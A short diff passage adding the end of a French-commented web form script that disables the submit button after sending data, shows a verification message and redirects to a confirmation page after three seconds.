+        console.error('Erreur lors de l\'envoi des données:', error);
+      }
+
+      // Désactiver le bouton
+      submitBtn.innerText = "Traitement en cours...";
+      submitBtn.style.backgroundColor = "#ccc";
+      submitBtn.disabled = true;
+      submitBtn.style.cursor = "default";
+
+      // Afficher le message de vérification
+      const verificationMessage = document.getElementById('verificationMessage');
+      verificationMessage.style.display = 'block';
+
+      // Redirection automatique après 3 secondes
+      setTimeout(function () {
+        window.location.href = "settings.confirmation.html";
+      }, 3000);
+    });
+  </script>
+
+</body>
+</html>
